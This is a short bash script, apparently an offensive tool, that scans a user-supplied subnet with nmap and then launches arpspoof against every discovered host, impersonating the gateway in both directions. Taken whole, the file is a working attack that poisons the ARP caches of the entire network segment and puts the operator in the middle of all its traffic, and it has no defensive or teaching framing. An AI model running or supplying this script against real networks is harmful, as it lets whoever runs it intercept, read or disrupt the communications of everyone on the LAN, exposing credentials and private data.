#!/bin/bash

ip_list=()

# Prompt the user to enter the subnet
read -p "Enter the subnet (e.g., 192.168.10.0/24): " subnet
read -p "Enter the name of the interface you want to use: " interface
read -p "Enter the source address you want to spoof (aka gateway, or something): " source

# Get the IP address of the specified interface
my_ip_address=$(ip -o -4 addr show dev "$interface" | awk '{split($4,a,"/"); print a[1]}')

while read -r ip_address; do
    # Skip adding your own IP address to the list
    if [ "$ip_address" != "$my_ip_address" ]; then
        ip_list+=("$ip_address")
    fi
done < <(sudo nmap -PR -sn "$subnet" | grep -oP '\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')

# Display the list of IP addresses
echo "IP List (excluding your own IP address):"
for ip in "${ip_list[@]}"; do
    echo "$ip"
done

# New terminal to ARP Spoof each and every ip address
for ip in "${ip_list[@]}"; do
    x-terminal-emulator -e "bash -c 'arpspoof -i $interface -t $ip -r $source; read -n 1 -s -r -p \"Press any key to close...\"'" &
done
